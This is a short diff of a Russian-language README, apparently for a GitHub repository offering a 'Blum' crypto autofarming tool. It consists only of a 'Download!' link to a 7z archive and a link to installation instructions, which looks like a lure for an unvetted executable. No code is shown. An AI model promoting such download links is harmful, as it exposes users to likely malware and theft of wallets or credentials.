@@ -1,4 +1,4 @@
-# [Скачать!](https://github.com/tiverrubix/Blum-New-Autofarming-Method/releases/download/Download/Blum_Aurtofarm_x64_x86.7z)
+# [Скачать!!!](https://github.com/tiverrubix/Blum-New-Autofarming-Method/releases/download/Download/Blum_Aurtofarm_x64_x86.7z)
 # [Нажмите здесь, чтобы ознакомиться с инструкциями по установке](https://github.com/tiverrubix/Blum-New-Autofarming-Method/blob/main/Installation%20instructions.txt)
 
 
